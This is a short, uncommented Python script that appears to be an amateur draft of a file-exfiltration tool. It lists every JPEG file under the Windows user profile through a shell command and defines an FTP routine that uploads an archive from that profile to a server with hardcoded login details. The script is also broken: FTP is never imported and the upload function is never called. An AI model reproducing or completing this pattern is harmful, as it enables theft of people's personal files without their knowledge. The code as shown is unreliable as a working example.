import os
import subprocess
def ftp_trans():
    logged_user_os_fix = os.environ['USERPROFILE']
    path_to_file = '{}\lmao.tar.gz'.format(logged_user_os_fix)
    ftp = FTP('127.0.0.1',user='test',passwd='jjcool4')
    file = open(path_to_file,'rb')
    ftp.cwd('/')
    ftp.storbinary('STOR lmao.tar.gz',file)
    ftp.quit()
    file.close()

logged_user_profile = os.environ['USERPROFILE']
print(logged_user_profile)
os.system('cd {} && dir *.jpeg /s /p'.format(logged_user_profile))